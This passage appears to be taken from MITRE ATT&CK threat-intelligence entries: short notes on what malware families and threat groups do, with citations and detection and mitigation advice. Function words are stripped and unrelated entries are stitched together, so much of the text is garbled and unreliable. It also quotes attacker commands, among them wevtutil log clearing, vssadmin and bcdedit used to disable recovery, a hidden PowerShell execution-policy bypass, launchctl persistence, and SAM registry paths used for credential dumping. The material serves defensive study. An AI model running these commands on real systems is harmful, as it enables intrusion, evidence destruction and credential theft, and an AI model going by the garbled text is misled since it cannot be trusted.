backdoors.(Citation: ESET ForSSHe December 2018) Monitor anomalous access websites cloud-based applications user locations systems match expected configurations. [TEMP.Veles](https://attack.mitre.org/groups/G0088) tools [Mimikatz](https://attack.mitre.org/software/S0002) [PsExec](https://attack.mitre.org/software/S0029).(Citation: FireEye TRITON 2019) [NotPetya](https://attack.mitre.org/software/S0368) valid credentials [PsExec](https://attack.mitre.org/software/S0029) <code>wmic</code> spread remote systems.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017) [Green Lambert](https://attack.mitre.org/software/S0690) collect time compromised host.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021) [Ragnar Locker](https://attack.mitre.org/software/S0481) rundll32.exe execute components VirtualBox.(Citation: Sophos Ragnar 2020) [FruitFly](https://attack.mitre.org/software/S0277) persists Launch Agent.(Citation: objsee mac malware 2017) [Kwampirs](https://attack.mitre.org/software/S0236) list C2 servers cycles successful connection established.(Citation: Symantec Orangeworm April 2018) (Citation: FireEye FIN7 March 2017) [FlawedAmmyy](https://attack.mitre.org/software/S0381) collect clipboard data.(Citation: Korean FSI TA505 2020) [Meteor](https://attack.mitre.org/software/S0688) ability search Kaspersky Antivirus victim's machine.(Citation: Check Meteor Aug 2021) Configure Increase Scheduling Priority option Administrators rights schedule priority process. configured GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority) strong two-factor multi-factor authentication remote service accounts mitigate adversary's ability leverage stolen credentials, aware [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111) techniques two-factor authentication implementations. [Wizard Spider](https://attack.mitre.org/groups/G0102) “systeminfo” commands acquire detailed configuration victim machine.(Citation: DFIR Ryuk's Return October 2020) [FIN5](https://attack.mitre.org/groups/G0053) legitimate VPN, RDP, Citrix, VNC credentials maintain access victim environment.(Citation: FireEye Respond Webinar July 2017)(Citation: DarkReading FireEye FIN5 Oct 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) [SombRAT](https://attack.mitre.org/software/S0615) execute <code>enum</code> enumerate files storage compromised system.(Citation: BlackBerry CostaRicto November 2020) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover operating configuration details <code>systeminfo</code> <code>set</code> commands.(Citation: Kaspersky Turla)(Citation: ESET ComRAT 2020) [Empire](https://attack.mitre.org/software/S0363) TLS encrypt C2 channel.(Citation: Github PowerShell Empire) [Ramsay](https://attack.mitre.org/software/S0458) base64-encoded portable executable hidden JPG header. [Ramsay](https://attack.mitre.org/software/S0458) embed document footers.(Citation: Eset Ramsay 2020)	 Ensure valid password filters registered. Filter DLLs Windows installation directory (<code>C:\Windows\System32\</code> default) domain controller local entry <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code>. (Citation: Install Password Filter n.d) [EvilBunny](https://attack.mitre.org/software/S0396) EnumProcesses() identify process running environment.(Citation: Cyphort EvilBunny Dec 2014) [Indrik Spider](https://attack.mitre.org/groups/G0119) [PsExec](https://attack.mitre.org/software/S0029) services prior execution ransomware.(Citation: Symantec WastedLocker June 2020) [Ebury](https://attack.mitre.org/software/S0377) intercepted unencrypted private private key pass-phrases.(Citation: ESET Ebury Feb 2014)	 [BoxCaon](https://attack.mitre.org/software/S0651) created folder collected files sends C2 server.(Citation: Checkpoint IndigoZebra July 2021)  [SNUGRIDE](https://attack.mitre.org/software/S0159) capable executing commands spawning reverse shell.(Citation: FireEye APT10 April 2017) [Zebrocy](https://attack.mitre.org/software/S0251) identifies network drives victim systems.(Citation: Securelist Sofacy Feb 2018) Ensure proper process file permissions inhibit adversaries disabling interfering critical services. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Exaramel Linux](https://attack.mitre.org/software/S0401) crontab persistence root privileges.(Citation: ESET TeleBots Oct 2018)(Citation: ANSSI Sandworm January 2021) (Citation: Kaspersky ThreatNeedle Feb 2021) [ShimRatReporter](https://attack.mitre.org/software/S0445) communicated preconfigured C2 servers.(Citation: FOX-IT 2016 Mofang) [UBoatRAT](https://attack.mitre.org/software/S0333) list running processes system.(Citation: PaloAlto UBoatRAT Nov 2017) [CookieMiner](https://attack.mitre.org/software/S0492) python scripts user’s system, Python variant [Empire](https://attack.mitre.org/software/S0363) agent, EmPyre.(Citation: Unit42 CookieMiner Jan 2019) [QakBot](https://attack.mitre.org/software/S0650) ability enumerate windows compromised host.(Citation: ATT QakBot April 2021)
 Ensure proper Registry permissions prevent adversaries disabling modifying firewall settings. [Conficker](https://attack.mitre.org/software/S0608) resets restore deletes backup files.(Citation: SANS Conficker) running administrator, [TDTESS](https://attack.mitre.org/software/S0164) installs service named bmwappushservice establish persistence.(Citation: ClearSky Wilted Tulip July 2017) [Penquin](https://attack.mitre.org/software/S0587) report file type disk space compromised host C2.(Citation: Leonardo Turla Penquin 2020) [Denis](https://attack.mitre.org/software/S0354) exploits security vulnerability load fake DLL execute code.(Citation: Cybereason Oceanlotus 2017) Prevent users installing launch agents launch daemons. [Valak](https://attack.mitre.org/software/S0476) PowerShell download additional modules.(Citation: Cybereason Valak 2020) [Amadey](https://attack.mitre.org/software/S1025) tasks install additional malware victim machine based Russia.(Citation: BlackBerry Amadey 2020) [Poseidon Group](https://attack.mitre.org/groups/G0033)'s Gathering Tool (IGT) includes PowerShell components.(Citation: Kaspersky Poseidon Group) [Flagpro](https://attack.mitre.org/software/S0696) close specific Windows Security Internet Explorer dialog boxes mask external connections.(Citation: NTT Security Flagpro December 2021) Monitor executed commands arguments attempt manipulate features artifacts legitimate benign users security tools. (Citation: Twitter ItsReallyNick Masquerading Update) [Keydnap](https://attack.mitre.org/software/S0276) Python scripting execute additional commands.(Citation: synack 2016 review) (Citation: FireEye APT34 Webinar Dec 2017) [XCSSET](https://attack.mitre.org/software/S0658) malicious browser application replace legitimate browser continuously capture credentials, monitor traffic, download additional modules.(Citation: trendmicro xcsset xcode project 2020) (Citation: Group-IB Anunak) [LAPSUS$](https://attack.mitre.org/groups/G1004) accessed internet-facing identity providers Azure Active Directory Okta target specific organizations.(Citation: MSTIC DEV-0537 Mar 2022) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware PowerShell commands perform functions, including gathering WMI executing commands C2 server.(Citation: Citizen Lab Stealth Falcon 2016) [NETWIRE](https://attack.mitre.org/software/S0198) discover collect victim information.(Citation: McAfee Netwire Mar 2015) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) hashed code's functions encrypted payloads base64 XOR.(Citation: Morphisec ShellTea June 2019) [Sakula](https://attack.mitre.org/software/S0074) samples cmd.exe delete temporary files.(Citation: Dell Sakula) [APT39](https://attack.mitre.org/groups/G0087) custom tools create SOCK5 custom protocol proxies infected hosts.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020) Monitor executed atq command ensure IP addresses stored SSH_CONNECTION SSH_CLIENT variables, machines created jobs, trusted hosts. jobs stored /var/spool/cron/atjobs/. [BLINDINGCAN](https://attack.mitre.org/software/S0520) encrypted C2 traffic RC4.(Citation: US-CERT BLINDINGCAN Aug 2020) [RobbinHood](https://attack.mitre.org/software/S0400) search RSA encryption key perform encryption process files.(Citation: CarbonBlack RobbinHood 2019)  [Silence](https://attack.mitre.org/groups/G0091) named backdoor "WINWORD.exe".(Citation: IB Silence Sept 2018) [Cobalt Strike](https://attack.mitre.org/software/S0154)'s "beacon" payload receive C2 protocol respond another. typically mixture HTTP, HTTPS, DNS traffic.(Citation: cobaltstrike manual) (Citation: Netscout Stolen Pencil Dec 2018) software store credentials Registry, ensure accounts limited permissions abused adversary. [FLASHFLOOD](https://attack.mitre.org/software/S0036) searches files (either default customized set file extensions) removable media copies staging area. default file types copied include data copied drive [SPACESHIP](https://attack.mitre.org/software/S0035).(Citation: FireEye APT30) (Citation: Lookout Dark Caracal Jan 2018)(Citation: CheckPoint Bandook Nov 2020)  [OilRig](https://attack.mitre.org/groups/G0049) <code>reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default”</code> victim query Registry.(Citation: Palo Alto OilRig 2016) Monitor Windows services repeatedly execute malicious payloads persistence. [ObliqueRAT](https://attack.mitre.org/software/S0644) capture images webcams compromised hosts.(Citation: Talos Oblique RAT March 2021) [menuPass](https://attack.mitre.org/groups/G0045) tools exploit ZeroLogon vulnerability (CVE-2020-1472).(Citation: Symantec Cicada November 2020) Ensure proper process file permissions prevent adversaries disabling modifying firewall settings. [CosmicDuke](https://attack.mitre.org/software/S0050) scheduled tasks typically named "Watchmon Service" persistence.(Citation: F-Secure Cosmicduke) [NOKKI](https://attack.mitre.org/software/S0353) gather victim IP address.(Citation: Unit 42 NOKKI Sept 2018) [Grandoreiro](https://attack.mitre.org/software/S0531) ability C2 communications.(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) [APT18](https://attack.mitre.org/groups/G0026) list files specific directories.(Citation: PaloAlto DNS Requests 2016) [DarkHydrus](https://attack.mitre.org/groups/G0079) spearphishing emails password-protected RAR archives malicious Excel Query files (.iqy). spearphishing emails contained malicious Office documents “attachedTemplate” technique load template remote server.(Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit 42 Phishery Aug 2018)(Citation: Unit 42 Playbook Dec 2017) [QakBot](https://attack.mitre.org/software/S0650) enumerate list installed programs.(Citation: IB Ransomware September 2020) Monitor newly constructed processes command-lines aid compression encrypting data collected prior exfiltration, 7-Zip, WinRAR, WinZip.   [LoudMiner](https://attack.mitre.org/software/S0451) MSI installer install virtualization software.(Citation: ESET LoudMiner June 2019)	 [HotCroissant](https://attack.mitre.org/software/S0431) ability determine current user administrator, Windows product name, processor name, screen resolution, physical RAM infected host.(Citation: US-CERT HOTCROISSANT February 2020) [Stuxnet](https://attack.mitre.org/software/S0603) installs RPC server P2P communications.(Citation: Symantec W.32 Stuxnet Dossier) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), attackers VBS code decode payloads.(Citation: Cylance Dust Storm) [Patchwork](https://attack.mitre.org/groups/G0040) spearphishing links deliver files exploits initial victims. embedded image tags (known bugs) unique, per-recipient tracking links emails purpose identifying recipients messages.(Citation: Symantec Patchwork)(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018)(Citation: Unit 42 BackConfig 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) JPG files encrypted payloads mask backdoor routines evade detection.(Citation: TrendMicro Tropic Trooper 2020) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware creates scheduled task entitled “IE Cache” execute malicious file hourly.(Citation: Citizen Lab Stealth Falcon 2016) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors deleted Windows security event logs `/Q /c wevtutil system` `/Q /c wevtutil security`.(Citation: FoxIT Wocao December 2019) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Monitor user accounts suspicious device associations, originating unusual sources, occurring unusual times, suspicious login.(Citation: DEV-0537)  [ChChes](https://attack.mitre.org/software/S0144) encrypt C2 traffic AES RC4.(Citation: Palo Alto menuPass Feb 2017)(Citation: JPCERT ChChes Feb 2017) link visited user, block unknown unused files transit default downloaded policy suspicious sites practice prevent vectors, .scr, .exe, .pif, .cpl, etc. download scanning devices analyze compressed encrypted formats, zip rar conceal malicious files. [Leviathan](https://attack.mitre.org/groups/G0065) archived victim's data prior exfiltration.(Citation: CISA AA21-200A APT40 July 2021) [Squirrelwaffle](https://attack.mitre.org/software/S1030) PowerShell execute payload.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) Enforce binaries signed correct Apple Developer IDs. Monitor unexpected deletion cloud storage infrastructure, <code>DeleteDBCluster</code> <code>DeleteGlobalCluster</code> events AWS, quantity data deletion events, <code>DeleteBucket</code>. events short period time malicious activity. [Maze](https://attack.mitre.org/software/S0449) decrypted strings encryption process. [Maze](https://attack.mitre.org/software/S0449) calls functions dynamically hinder analysis.(Citation: McAfee Maze March 2020)	 (Citation: FireEye admin@338) [DownPaper](https://attack.mitre.org/software/S0186) PowerShell execution.(Citation: ClearSky Charming Kitten Dec 2017) [Azorult](https://attack.mitre.org/software/S0344) collect machine information, architecture, OS version, name, Windows product name, CPU cores, video card information, language.(Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018) [FELIXROOT](https://attack.mitre.org/software/S0267) creates .LNK file persistence.(Citation: ESET GreyEnergy Oct 2018) Update software regularly employing patch management internal enterprise endpoints servers. internal traffic, monitor workstation-to-workstation unusual (vs. baseline) SMB traffic. networks any, depends systems network configured resources located. [RemoteUtilities](https://attack.mitre.org/software/S0592) upload download files target machine.(Citation: Trend Micro Muddy Water March 2021) [Emotet](https://attack.mitre.org/software/S0367) observed enumerating local processes.(Citation: ASEC Emotet 2017) [DarkHydrus](https://attack.mitre.org/groups/G0079) open-source tool, Phishery, inject malicious remote template URLs Word documents victims enable [Forced Authentication](https://attack.mitre.org/techniques/T1187).(Citation: Unit 42 Phishery Aug 2018) [Chaes](https://attack.mitre.org/software/S0631) download additional files infected machine.(Citation: Cybereason Chaes Nov 2020) [Saint Bot](https://attack.mitre.org/software/S1018) `InstallUtil.exe` download deploy executables.(Citation: Malwarebytes Saint Bot April 2021) [Invoke-PSImage](https://attack.mitre.org/software/S0231) embed payload data image file.(Citation: GitHub PSImage) [FLIPSIDE](https://attack.mitre.org/software/S0173) RDP tunnel traffic victim environment.(Citation: Mandiant FIN5 GrrCON Oct 2016) [Zebrocy](https://attack.mitre.org/software/S0251) decodes secondary payload writes victim’s machine. [Zebrocy](https://attack.mitre.org/software/S0251) AES XOR decrypt strings payloads.(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018) (Citation: NCC TA505) [PoetRAT](https://attack.mitre.org/software/S0428) executed Lua script Lua interpreter Windows.(Citation: Talos PoetRAT October 2020) [Chinoxy](https://attack.mitre.org/software/S1041) `eoffice.exe` attempt legitimate file.(Citation: Bitdefender FunnyDream Campaign November 2020) [Bazar](https://attack.mitre.org/software/S0534) execute WMI query gather installed antivirus engine.(Citation: Cybereason Bazar July 2020)(Citation: DFIR Ryuk's Return October 2020) Enforce principle least-privilege. implementing access control mechanisms include authentication authorization. [The White Company](https://attack.mitre.org/groups/G0089) phishing emails malicious Word attachments victims.(Citation: Cylance Shaheen Nov 2018) [Ngrok](https://attack.mitre.org/software/S0508) proxy connections machines located NAT firewalls.(Citation: MalwareBytes Ngrok February 2020)(Citation: Zdnet Ngrok September 2018) Frequently check permissions cloud storage ensure proper permissions set deny unprivileged access resources.(Citation: Amazon S3 Security, 2019) [InvisiMole](https://attack.mitre.org/software/S0260) InvisiMole identify proxy servers victim C2 communication.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [USBStealer](https://attack.mitre.org/software/S0136) drops removable media relies Autorun execute malicious file user removable media system.(Citation: ESET Sednit USBStealer 2014) [Squirrelwaffle](https://attack.mitre.org/software/S1030) `cmd.exe` execution.(Citation: Netskope Squirrelwaffle Oct 2021) remote access services privileged account necessary. [Octopus](https://attack.mitre.org/software/S0340) relied users clicking malicious attachment delivered spearphishing.(Citation: ESET Nomadic Octopus 2018) [TA505](https://attack.mitre.org/groups/G0092) spearphishing emails malicious links.(Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 Jan 2019)(Citation: Trend Micro TA505 June 2019)(Citation: Proofpoint TA505 October 2019) Monitor API calls (such <code>GetForegroundWindow()</code>) attempt listing application windows.  [Maze](https://attack.mitre.org/software/S0449) delivered components ransomware attacks MSI files, executed command-line <code>msiexec</code>.(Citation: Sophos Maze VM September 2020) [Cryptoistic](https://attack.mitre.org/software/S0498) gather data user compromised host.(Citation: SentinelOne Lazarus macOS July 2020) (Citation: ESET Operation Spalax Jan 2021) [IceApple](https://attack.mitre.org/software/S1022)'s Credential Dumper module dump encrypted password hashes SAM registry keys, including `HKLM\SAM\SAM\Domains\Account\F` `HKLM\SAM\SAM\Domains\Account\Users\*\V`.(Citation: CrowdStrike IceApple 2022) [Chimera](https://attack.mitre.org/groups/G0114) WMIC execute remote commands.(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) Detecting presence stripped payloads difficult unwarranted real-time, analyzing contextual data files (such content character entropy) highlight attempts obfuscation. [CORESHELL](https://attack.mitre.org/software/S0137) downloads dropper C2 server.(Citation: FireEye APT28) [Sibot](https://attack.mitre.org/software/S0589) installed second-stage script <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot</code> registry key.(Citation: MSTIC NOBELIUM Mar 2021) application deployment configured deploy signed binaries, ensure trusted signing certificates co-located application deployment located accessed remotely remote access tightly controlled. [Turla](https://attack.mitre.org/groups/G0010) VPS infrastructure compromised Iranian threat actors.(Citation: NSA NCSC Turla OilRig)  [Komplex](https://attack.mitre.org/software/S0162) trojan creates persistent launch agent called <code>$HOME/Library/LaunchAgents/com.apple.updates.plist</code> <code>launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist</code>.(Citation: Sofacy Komplex Trojan) [LoudMiner](https://attack.mitre.org/software/S0451) batch script Linux virtual machine service.(Citation: ESET LoudMiner June 2019) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware families install services.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) [GoldFinder](https://attack.mitre.org/software/S0597) C2.(Citation: MSTIC NOBELIUM Mar 2021) [BLUELIGHT](https://attack.mitre.org/software/S0657) captured screenshot display 30 5 minutes initiating C2 loop, minutes thereafter.(Citation: Volexity InkySquid BLUELIGHT August 2021) [POWERTON](https://attack.mitre.org/software/S0371) install Registry key persistence.(Citation: FireEye APT33 Guardrail) [Neoichor](https://attack.mitre.org/software/S0691) C2 communications.(Citation: NICKEL December 2021) [Dyre](https://attack.mitre.org/software/S0024) ability identify installed programs compromised host.(Citation: Malwarebytes Dyreza November 2015) [APT18](https://attack.mitre.org/groups/G0026) cmd.exe execute commands victim’s machine.(Citation: PaloAlto DNS Requests 2016)(Citation: Anomali Evasive Maneuvers July 2015) [PoshC2](https://attack.mitre.org/software/S0378) perform port scans infected host.(Citation: GitHub PoshC2) [KillDisk](https://attack.mitre.org/software/S0607) deletes files OS unbootable. [KillDisk](https://attack.mitre.org/software/S0607) targets deletes files 35 file extensions.(Citation: ESEST Black Energy Jan 2016) [Kasidet](https://attack.mitre.org/software/S0088) ability initiate keylogging.(Citation: Zscaler Kasidet) [Fox Kitten](https://attack.mitre.org/groups/G0117) Twitter account communicate ransomware victims.(Citation: ClearSky Pay2Kitten December 2020) [AppleSeed](https://attack.mitre.org/software/S0622) collect data removable media devices.(Citation: Malwarebytes Kimsuky June 2021)(Citation: KISA Operation Muzabi) [PowerDuke](https://attack.mitre.org/software/S0139) runs <code>cmd.exe /c</code> sends output C2.(Citation: Volexity PowerDuke November 2016) (Citation: US-CERT Volgmer Nov 2017) [ThiefQuest](https://attack.mitre.org/software/S0595) invokes <code>time</code> check system's time, executes <code>sleep</code> command, invokes <code>time</code> call, compares time difference <code>time</code> calls time slept identify sandbox.(Citation: wardle evilquest parti) [Gelsemium](https://attack.mitre.org/software/S0666) ability compress components.(Citation: ESET Gelsemium June 2021) (Citation: PTSecurity Cobalt Aug 2017)(Citation: IB Cobalt Aug 2017) Monitor newly constructed BITS tasks enumerate BITSAdmin tool (bitsadmin /list /allusers /verbose).  [AutoIt backdoor](https://attack.mitre.org/software/S0129) downloads PowerShell script decodes typical shellcode loader.(Citation: Forcepoint Monsoon) [KeyBoy](https://attack.mitre.org/software/S0387) launch interactive shells communicating victim machine.(Citation: PWC KeyBoys Feb 2017)(Citation: Rapid7 KeyBoy Jun 2013) [APT18](https://attack.mitre.org/groups/G0026) establishes persistence <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> key.(Citation: Anomali Evasive Maneuvers July 2015)(Citation: PaloAlto DNS Requests 2016) [XCSSET](https://attack.mitre.org/software/S0658) attempts discover accounts locations user's Evernote, AppleID, Telegram, Skype, WeChat data.(Citation: trendmicro xcsset xcode project 2020) [STARWHALE](https://attack.mitre.org/software/S1037) ability hex-encode collected data infected host.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [LazyScripter](https://attack.mitre.org/groups/G0140) spam emails link redirects victim download malicious document.(Citation: MalwareBytes LazyScripter Feb 2021)  [Action RAT](https://attack.mitre.org/software/S1028) ability collect username infected host.(Citation: MalwareBytes SideCopy Dec 2021) [Dridex](https://attack.mitre.org/software/S0384) multiple layers proxy servers hide terminal nodes infrastructure.(Citation: Checkpoint Dridex Jan 2021) user training bring awareness common phishing spearphishing techniques raise suspicion malicious events. [KeyBoy](https://attack.mitre.org/software/S0387) attempts collect passwords browsers.(Citation: Rapid7 KeyBoy Jun 2013) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors shells, target systems threat actors, reconnaissance lateral movement.(Citation: FoxIT Wocao December 2019) [admin@338](https://attack.mitre.org/groups/G0018) exploited client software vulnerabilities execution, Word CVE-2012-0158.(Citation: FireEye admin@338) [FIN8](https://attack.mitre.org/groups/G0061) Plink utility tunnel RDP C2 infrastructure.(Citation: FireEye Enemy FIN8 Aug 2016) [Olympic Destroyer](https://attack.mitre.org/software/S0365) native Windows utilities <code>vssadmin</code>, <code>wbadmin</code>, <code>bcdedit</code> delete disable operating recovery features Windows backup catalog Windows Automatic Repair.(Citation: Talos Olympic Destroyer 2018) [FELIXROOT](https://attack.mitre.org/software/S0267) downloads uploads files victim’s machine.(Citation: FireEye FELIXROOT July 2018)(Citation: ESET GreyEnergy Oct 2018) (Citation: Novetta-Axiom)(Citation: Cisco 72) (Citation: TrendMicro TropicTrooper 2015) [NETWIRE](https://attack.mitre.org/software/S0198) spread e-mail campaigns utilizing malicious attachments.(Citation: Unit 42 NETWIRE April 2020)(Citation: Proofpoint NETWIRE December 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) disguised malicious template files JPEG files avoid detection.(Citation: McAfee Lazarus Jul 2020) [Threat Group-3390](https://attack.mitre.org/groups/G0027) performed DLL search hijacking execute payload.(Citation: Nccgroup Emissary Panda 2018) [Comnie](https://attack.mitre.org/software/S0244) appends total 64MB garbage data file deter security products scanning files disk.(Citation: Palo Alto Comnie) [Bisonal](https://attack.mitre.org/software/S0268) execute <code>ipconfig</code> victim’s machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020)  [Kazuar](https://attack.mitre.org/software/S0265) uploads files directory C2 server.(Citation: Unit 42 Kazuar 2017) remote access SSH root privileged accounts. [PyDCrypt](https://attack.mitre.org/software/S1032) remove created artifacts dropped executables.(Citation: Checkpoint MosesStaff Nov 2021) removing previous versions tools unnecessary environment possible. [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) executed DLL search hijacking.(Citation: ESET BackdoorDiplomacy Jun 2021) [Egregor](https://attack.mitre.org/software/S0554) batch files execution launch Internet Explorer cmd.exe.(Citation: JoeSecurity Egregor 2020)(Citation: Cybereason Egregor Nov 2020)  (Citation: DFIR Conti Bazar Nov 2021) (Citation: Unit42 SilverTerrier 2018) [Netwalker](https://attack.mitre.org/software/S0457) WMI delete Shadow Volumes.(Citation: TrendMicro Netwalker 2020)	 [Egregor](https://attack.mitre.org/software/S0554) modify GPO evade detection.(Citation: Cybereason Egregor Nov 2020) (Citation: Intrinsec Egregor Nov 2020) (Citation: Symantec Waterbug Jun 2019) Limit credential overlap accounts systems training users administrators password multiple accounts. [Fox Kitten](https://attack.mitre.org/groups/G0117) named binaries configuration files svhost dllhost legitimate.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [TA551](https://attack.mitre.org/groups/G0127) <code>cmd.exe</code> execute commands.(Citation: Unit 42 TA551 Jan 2021) Monitor newly executed processes search local sources, file systems local databases, files sensitive data prior Exfiltration. [Kazuar](https://attack.mitre.org/software/S0265) gathers network adapters.(Citation: Unit 42 Kazuar 2017) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `tasklist` command advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [BISCUIT](https://attack.mitre.org/software/S0017) SSL encrypting C2 communications.(Citation: Mandiant APT1 Appendix) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors `wmiexec.vbs` remote commands.(Citation: Bitdefender FunnyDream Campaign November 2020) Monitor executed processes command-line arguments actions gather local email files. Remote access tools built-in features interact Windows API gather information. acquired Windows management tools Windows Management Instrumentation PowerShell. [CharmPower](https://attack.mitre.org/software/S0674) send additional modules C2 encoded base64.(Citation: Check APT35 CharmPower January 2022) [Empire](https://attack.mitre.org/software/S0363) <code>Invoke-RunAs</code> tokens.(Citation: Github PowerShell Empire) [Clambling](https://attack.mitre.org/software/S0660) enumerate IP address compromised machine.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [NETWIRE](https://attack.mitre.org/software/S0198) ability write collected data file created <code>./LOGS</code> directory.(Citation: FireEye NETWIRE March 2019) [Magic Hound](https://attack.mitre.org/groups/G0059) created fake LinkedIn social media accounts contact targets convince them--through messages voice communications--to malicious links.(Citation: ClearSky Kittens 3 August 2020) [TrickBot](https://attack.mitre.org/software/S0266) utilizes EternalBlue EternalRomance exploits lateral movement modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.(Citation: ESET Trickbot Oct 2020) [APT28](https://attack.mitre.org/groups/G0007) CVE-2015-4902 bypass security features.(Citation: Bitdefender APT28 Dec 2015)(Citation: SIR 19) [FLASHFLOOD](https://attack.mitre.org/software/S0036) stages data copies local removable drives "%WINDIR%\$NtUninstallKB885884$\" directory.(Citation: FireEye APT30) version [KONNI](https://attack.mitre.org/software/S0356) drops Windows shortcut victim’s machine establish persistence.(Citation: Talos Konni 2017) Monitor files accessed exfiltration, file reads process active network connection. [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors [Empire](https://attack.mitre.org/software/S0363).(Citation: Talos Frankenstein June 2019) (Citation: Scarlet Mimic Jan 2016) [RobbinHood](https://attack.mitre.org/software/S0400) cmd.exe victim's computer.(Citation: CarbonBlack RobbinHood 2019) variants [Zeroaccess](https://attack.mitre.org/software/S0027) Trojan store data Extended Attributes.(Citation: Ciubotariu 2014) Monitor executed commands arguments attempt dump credentials account login credential material, form hash password, operating software. command-lines invoke AuditD Security Accounts Manager (SAM). Remote access tools built-in features incorporate existing tools [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts exist credential dumping functionality, PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) require additional logging features configured operating collect analysis. [Molerats](https://attack.mitre.org/groups/G0021) malicious files email tricked users clicking Enable Content embedded macro download malicious archives.(Citation: Kaspersky MoleRATs April 2019)(Citation: Unit42 Molerat Mar 2020)(Citation: Cybereason Molerats Dec 2020) [RogueRobin](https://attack.mitre.org/software/S0270) command prompt PowerShell script Excel.(Citation: Unit 42 DarkHydrus July 2018) assist establishing persistence, [RogueRobin](https://attack.mitre.org/software/S0270) creates <code>%APPDATA%\OneDrive.bat</code> saves string it:<code>powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\OneDrive.ps1”</code>.(Citation: Unit42 DarkHydrus Jan 2019)(Citation: Unit 42 DarkHydrus July 2018) [UNC2452](https://attack.mitre.org/groups/G0118) exfiltrated collected data simple HTTPS request password-protected archive staged victim's OWA servers.(Citation: Volexity SolarWinds) [APT3](https://attack.mitre.org/groups/G0022) tool enumerate permissions Windows groups.(Citation: Symantec Buckeye) Monitor unusual kernel driver installation activity  [Cyclops Blink](https://attack.mitre.org/software/S0687) download files HTTPS.(Citation: NCSC Cyclops Blink February 2022)(Citation: Trend Micro Cyclops Blink March 2022) [T9000](https://attack.mitre.org/software/S0098) Skype API record audio video calls. writes encrypted data <code>%APPDATA%\Intel\Skype</code>.(Citation: Palo Alto T9000 Feb 2016) Monitor executed commands arguments attempt gather attached peripheral devices components connected system. [Volgmer](https://attack.mitre.org/software/S0180) variants add services display names generated list hard-coded strings Application, Background, Security, Windows, masquerade legitimate service.(Citation: US-CERT Volgmer 2 Nov 2017)(Citation: Symantec Volgmer Aug 2014) [Linux Rabbit](https://attack.mitre.org/software/S0362) acquires valid SSH accounts brute force. (Citation: Anomali Linux Rabbit 2018) [Kimsuky](https://attack.mitre.org/groups/G0094) file injector DLL spawn benign process victim's inject malicious payload process hollowing.(Citation: Talos Kimsuky Nov 2021) difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing. types virtualization application microsegmentation mitigate impact types exploitation. Risks additional exploits weaknesses systems exist.(Citation: Ars Technica Pwn2Own 2017 VM Escape) [AppleJeus](https://attack.mitre.org/software/S0584) waited time downloading stage payload.(Citation: CISA AppleJeus Feb 2021) Monitor newly constructed instances attempt advantage weakness Internet-facing program software, data, commands unintended unanticipated behavior. [Volgmer](https://attack.mitre.org/software/S0180) variant encoded simple XOR cipher.(Citation: US-CERT Volgmer 2 Nov 2017) Monitor handle volumes processes determine collecting data logical drives. (Citation: Github PowerSploit Ninjacopy) [USBStealer](https://attack.mitre.org/software/S0136) commands delete files malware victim.(Citation: ESET Sednit USBStealer 2014) Windows, monitor Windows Task Scheduler stores `%systemroot%\System32\Tasks` change entries scheduled tasks, correlate software, patch cycles, etc. Linux macOS, [at](https://attack.mitre.org/software/S0110) jobs stored <code>/var/spool/cron/atjobs/</code>.(Citation: rowland linux 2019) (Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 